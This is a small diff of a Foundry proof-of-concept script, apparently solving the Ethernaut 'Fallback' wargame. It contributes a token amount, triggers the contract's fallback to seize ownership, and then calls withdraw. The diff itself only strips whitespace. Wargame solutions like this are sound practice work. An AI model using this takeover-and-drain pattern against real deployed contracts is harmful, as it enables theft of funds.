@@ -15,9 +15,9 @@ contract FallbackPOCScript is Script {
         instance.contribute{value: 1 wei}();
         (bool success,) = payable(INSTANCE).call{value: 1 wei}("");
         require(success);
-        
+
         instance.withdraw();
-        
+
         vm.stopBroadcast();
     }
 }
